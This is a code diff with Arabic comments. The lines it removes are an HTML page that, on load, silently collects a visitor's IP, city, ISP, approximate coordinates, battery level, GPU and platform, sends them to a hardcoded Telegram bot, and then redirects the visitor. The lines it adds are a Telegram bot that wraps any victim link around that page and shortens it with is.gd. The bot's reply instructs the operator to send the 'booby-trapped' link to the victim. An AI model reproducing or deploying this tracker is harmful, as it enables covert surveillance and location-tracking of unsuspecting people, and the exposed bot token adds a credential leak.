@@ -1,37 +1,47 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <script>
-        async function capture() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('u') || "https://t.me/vo11a";
-            const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
-            const chat_id = "5773364548";
+import telebot
+import requests
 
-            // جمع معلومات الجهاز والبطارية والـ GPU
-            let batt = "N/A";
-            try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e) {}
-            
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Unknown";
+# معلوماتك الأساسية (التوكن والايدي مالتك)
+API_TOKEN = '8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8'
+MY_GITHUB_URL = "https://lbrahimxoxo11xgmailcom.github.io/verify/" # رابط مشروعك
+bot = telebot.TeleBot(API_TOKEN)
 
-            // جلب الآيبي والموقع
-            let ipData = { ip: "N/A", city: "N/A", org: "N/A", latitude: "0", longitude: "0" };
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch(e) {}
+# دالة الاختصار
+def shorten(url):
+    try:
+        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
+        return res.text if res.status_code == 200 else url
+    except:
+        return url
 
-            const msg = `🚀 صيد جديد 🚀\n🌐 IP: ${ipData.ip}\n📍 مدينة: ${ipData.city}\n🏢 شركة: ${ipData.org}\n🔋 بطارية: ${batt}\n🖥️ GPU: ${gpu}\n📱 نظام: ${navigator.platform}\n📍 خريطة: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+@bot.message_handler(func=lambda message: True)
+def handle_link(message):
+    user_text = message.text
+    
+    if user_text.startswith("http"):
+        bot.reply_to(message, "⏳ جارِ الدمج والتلغيم والاختصار...")
+        
+        # 1. دمج رابط الضحية مع كود الصيد مالتك
+        full_malicious_url = f"{MY_GITHUB_URL}?u={user_text}"
+        
+        # 2. اختصار الرابط النهائي
+        final_short_url = shorten(full_malicious_url)
+        
+        # 3. إرسال النتيجة
+        reply = f"""
+🚀 **تم تجهيز الرابط الملغم بنجاح** 🚀
+━━━━━━━━━━━━━━━
 
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-            window.location.replace(target);
-        }
-        window.onload = capture;
-    </script>
-</head>
-<body style="background:#000;"></body>
-</html>
+🔗 **الرابط المختصر:**
+`{final_short_url}`
+
+💡 **طريقة العمل:**
+ارسل هذا الرابط للضحية. أول ما يفتحه، راح يوصلك "الرصد الاحترافي" هنا، والضحية راح يتحول تلقائياً للرابط اللي دزيته أنت.
+━━━━━━━━━━━━━━━
+        """
+        bot.send_message(message.chat.id, reply, parse_mode="Markdown")
+    else:
+        bot.reply_to(message, "ارسل لي أي رابط (يوتيوب، تليجرام، الخ) حتى ألغمه الك.")
+
+print("🚀 البوت شغال وجاهز للتلغيم...")
+bot.polling()
